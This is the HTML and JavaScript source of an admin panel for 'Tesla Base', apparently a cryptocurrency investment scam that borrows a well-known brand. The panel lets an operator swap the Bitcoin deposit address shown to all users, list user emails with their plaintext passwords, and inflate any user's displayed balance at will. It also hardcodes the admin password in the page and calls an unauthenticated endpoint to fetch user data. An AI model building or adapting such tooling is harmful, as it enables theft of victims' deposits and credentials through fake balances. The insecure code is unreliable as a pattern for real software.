<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla Base | Admin Control</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #E31937; padding-bottom: 10px; margin-bottom: 30px; }
        .card { background: #111; border: 1px solid #222; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        h2 { color: #E31937; margin-top: 0; }
        
        /* Wallet Update Section */
        .wallet-box { display: flex; gap: 10px; }
        input { flex: 1; padding: 12px; background: #000; border: 1px solid #333; color: #fff; border-radius: 5px; }
        button { padding: 12px 25px; background: #E31937; border: none; color: #fff; font-weight: bold; border-radius: 5px; cursor: pointer; }
        
        /* User Table */
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { text-align: left; background: #222; padding: 15px; border-bottom: 2px solid #333; }
        td { padding: 15px; border-bottom: 1px solid #222; font-family: monospace; }
        tr:hover { background: #151515; }
        .balance { color: #00ff00; font-weight: bold; }

        .status-msg { margin-top: 10px; font-size: 14px; display: none; }
    </style>
</head>
<body>

<div class="container" id="adminContent" style="display:none;">
    <div class="header">
        <h1>TESLA BASE ADMIN</h1>
        <button onclick="logout()" style="background:#333;">Logout</button>
    </div>

    <div class="card">
        <h2>Update Bitcoin Deposit Wallet</h2>
        <p style="color:#888; font-size:14px;">This address will be displayed to all users on the deposit page.</p>
        <div class="wallet-box">
            <input type="text" id="newBtcAddress" placeholder="Enter new BTC Address">
            <button onclick="updateWallet()">Update Website</button>
        </div>
        <p id="walletStatus" class="status-msg"></p>
    </div>

    <div class="card">
        <h2>User Accounts (Emails & Passwords)</h2>
        <table>
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Password</th>
                    <th>Balance</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="userTable">
                </tbody>
        </table>
    </div>
</div>

<script>
    const ADMIN_PASS = "SOLOMON200";
    const baseUrl = "https://tesla-base.onrender.com"; // Your Render URL

    // Simple Gatekeeper
    window.onload = function() {
        const auth = prompt("Enter Admin Password:");
        if (auth === ADMIN_PASS) {
            document.getElementById('adminContent').style.display = 'block';
            loadUsers();
        } else {
            alert("Access Denied");
            window.location.href = "index.html";
        }
    }

    // FEATURE: Update Bitcoin Wallet
    async function updateWallet() {
        const newAddress = document.getElementById('newBtcAddress').value;
        const status = document.getElementById('walletStatus');
        
        if(!newAddress) return;

        try {
            const res = await fetch(`${baseUrl}/api/admin/update-wallet`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ password: ADMIN_PASS, newAddress: newAddress })
            });
            if (res.ok) {
                status.innerText = "✅ Bitcoin address updated successfully!";
                status.style.color = "#00ff00";
                status.style.display = "block";
            }
        } catch (e) {
            status.innerText = "❌ Update failed.";
            status.style.color = "#ff3b3b";
            status.style.display = "block";
        }
    }

    // FEATURE: View Emails, Passwords, and Balances
    async function loadUsers() {
        try {
            const res = await fetch(`${baseUrl}/api/admin/users`);
            const users = await res.json();
            const table = document.getElementById('userTable');
            table.innerHTML = "";

            users.forEach(user => {
                table.innerHTML += `
                    <tr>
                        <td>${user.email}</td>
                        <td>${user.password}</td>
                        <td class="balance">$${parseFloat(user.balance).toLocaleString()}</td>
                        <td><button onclick="injectFunds('${user.email}')" style="padding:5px 10px; font-size:12px;">Add Funds</button></td>
                    </tr>
                `;
            });
        } catch (e) {
            console.error("Failed to load users");
        }
    }

    async function injectFunds(email) {
        const amount = prompt(`How much to add to ${email}?`);
        if (amount) {
            await fetch(`${baseUrl}/api/user/update-balance`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ email: email, amount: parseFloat(amount) })
            });
            loadUsers();
        }
    }

    function logout() {
        window.location.href = "index.html";
    }
</script>

</body>
</html>
